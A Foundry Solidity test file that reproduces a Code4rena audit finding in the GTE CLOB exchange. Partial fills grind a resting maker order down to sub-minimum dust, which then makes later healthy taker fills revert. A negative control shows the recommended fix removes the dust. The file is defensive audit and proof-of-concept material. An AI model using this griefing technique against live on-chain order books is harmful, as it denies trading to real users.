// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {
    Exploit,
    CLOB,
    CLOBFixed,
    MiniToken,
    MarketConfig,
    MarketSettings
} from "./64870-h-02-dust-orders-can-block-order-posting-code4rena-gte-gte-g.sol";

// GTE CLOB H-02 — "Dust orders can block order posting".
// Real audited source: code-423n4/2025-07-gte-clob @ 9f06332ebd4cfe2577d9eae81aeb58d3662ffccd
//   CLOB.sol _matchIncomingOrder (L807-848, dust-decrement L847), ZeroCostTrade guard L439,
//   Book.sol getQuoteTokenAmount L471-477 (round-down to 0).
contract DustOrderBlocksPostingTest is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant MAKER_A = 0x000000000000000000000000000000000000aaaa;
    address internal constant MAKER_B = 0x000000000000000000000000000000000000BbBB;

    uint256 internal constant BASE_SIZE = 1e18;
    uint256 internal constant LOT_SIZE = 1e6;
    uint256 internal constant MIN_LIMIT = 1e9;
    uint256 internal constant PRICE = 1e11;
    uint256 internal constant HEALTHY = 1e9;

    function _config() internal pure returns (MarketConfig memory) {
        return MarketConfig({quoteToken: address(0), baseToken: address(0), quoteSize: BASE_SIZE, baseSize: BASE_SIZE});
    }

    function _settings() internal pure returns (MarketSettings memory) {
        return MarketSettings({
            status: true,
            maxLimitsPerTx: 255,
            minLimitOrderAmountInBase: MIN_LIMIT,
            tickSize: 1,
            lotSizeInBase: LOT_SIZE
        });
    }

    // ── Exploit path: dust grinds a maker below MIN_LIMIT, then blocks a healthy taker fill ──
    function test_exploit_dustOrderBlocksIncomingFill() public {
        Exploit e = new Exploit();
        e.run();

        // Root-cause state: a resting maker order was ground to a sub-minimum DUST amount.
        assertEq(e.dustAmount(), LOT_SIZE, "maker ground to one-lot dust");
        assertLt(e.dustAmount(), e.minLimit(), "dust is below minLimitOrderAmountInBase");

        // Harm: the incoming healthy fill reverted with ZeroCostTrade (liveness DoS).
        assertTrue(e.blockedByZeroCostTrade(), "incoming fill was blocked by ZeroCostTrade");

        // DoS marker recorded at the SINK: 1 blocked order.
        MiniToken marker = MiniToken(e.markerAddr());
        assertEq(marker.balanceOf(SINK), 1, "one blocked order recorded at SINK");
        assertEq(e.sinkBlockedOrders(), 1, "exploit-exposed sink count matches");
    }

    // ── Direct reproduction of the block against the VERBATIM vulnerable CLOB ──
    function test_direct_buggyFillRevertsZeroCostTrade() public {
        CLOB clob = new CLOB();
        clob.initMarket(_config(), _settings());
        clob.placeAsk(MAKER_A, PRICE, HEALTHY);
        clob.placeAsk(MAKER_B, PRICE, HEALTHY);

        // Grind maker #A to dust; this partial fill has quoteDelta > 0 and succeeds.
        clob.fillBuy(HEALTHY - LOT_SIZE, PRICE);
        assertEq(clob.askOrderAmount(PRICE), LOT_SIZE, "dust created at head of book");

        // The healthy 10-lot fill (real liquidity exists) reverts at the dust.
        vm.expectRevert(CLOB.ZeroCostTrade.selector);
        clob.fillBuy(10 * LOT_SIZE, PRICE);

        // The dust persists after the revert (griefing is permanent).
        assertEq(clob.askOrderAmount(PRICE), LOT_SIZE, "dust still resting after revert");
    }

    // ── Negative control: the recommended fix removes dust, so the SAME fill succeeds ──
    function test_control_fixedRemovesDust_fillSucceeds() public {
        CLOBFixed clob = new CLOBFixed();
        clob.initMarket(_config(), _settings());
        clob.placeAsk(MAKER_A, PRICE, HEALTHY);
        clob.placeAsk(MAKER_B, PRICE, HEALTHY);

        // Same grinding fill; the fix drops maker #A once its remainder falls below MIN_LIMIT.
        clob.fillBuy(HEALTHY - LOT_SIZE, PRICE);
        // Head is now the healthy maker #B (dust #A was removed), not a dust order.
        assertEq(clob.askOrderAmount(PRICE), HEALTHY, "no dust rests under the fix");

        // The identical 10-lot fill that reverted on the buggy CLOB now executes.
        (uint256 quoteSent, uint256 baseReceived) = clob.fillBuy(10 * LOT_SIZE, PRICE);
        assertGt(quoteSent, 0, "fill executes: non-zero quote sent");
        assertEq(baseReceived, 10 * LOT_SIZE, "taker received the base it asked for");
    }
}
